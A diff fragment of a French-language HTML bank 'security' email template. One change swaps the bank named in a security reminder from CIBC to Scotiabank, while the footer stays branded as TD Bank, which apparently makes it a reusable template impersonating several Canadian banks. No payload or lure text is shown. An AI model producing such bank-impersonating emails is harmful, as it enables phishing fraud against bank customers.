-        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Rappel de s&eacute;curit&eacute;&nbsp;:</strong> La Banque CIBC ne vous demandera jamais votre mot de passe, NIP ou num&eacute;ro de carte complet par courriel ou par t&eacute;l&eacute;phone. Si vous avez un doute, contactez-nous au <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
+        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Rappel de s&eacute;curit&eacute;&nbsp;:</strong> La Banque Scotiabank ne vous demandera jamais votre mot de passe, NIP ou num&eacute;ro de carte complet par courriel ou par t&eacute;l&eacute;phone. Si vous avez un doute, contactez-nous au <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
         <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">Banque TD</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Confidentialit&eacute;</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Conditions d&apos;utilisation</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Nous contacter</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">Ce courriel a &eacute;t&eacute; envoy&eacute; automatiquement par le syst&egrave;me de s&eacute;curit&eacute; de TD Banque. Merci de ne pas r&eacute;pondre directement &agrave; ce message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Banque. Tous droits r&eacute;serv&eacute;s. La Banque Toronto-Dominion.</p></td></tr></table></td></tr>
         <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
       </table>
